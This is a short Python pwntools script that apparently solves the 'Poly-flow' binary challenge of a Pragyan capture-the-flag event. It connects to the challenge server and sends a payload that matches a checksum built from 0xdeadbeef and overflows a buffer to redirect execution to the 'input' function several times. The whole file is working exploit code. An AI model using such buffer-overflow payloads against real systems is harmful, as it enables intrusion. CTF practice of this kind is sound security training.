import time
from pwn import *

# p = process('Poly-flow')
p = remote('binary.challs.pragyanctf.tech', 6002)
e = ELF('Poly-flow')

payload = p64(0xdeadbeef//4+1)[:4]*3
payload += p64(0xdeadbeef//4)[:4]
payload += b'A' * 0x18
payload += p32(e.symbols['input'])
payload += p32(e.symbols['input'])

p.sendline(payload)

payload = b'A' * 0x18
payload += p32(e.symbols['input'])
payload += p32(e.symbols['input'])

for i in range(4):
    p.sendline(payload)
    time.sleep(0.5)

p.interactive()
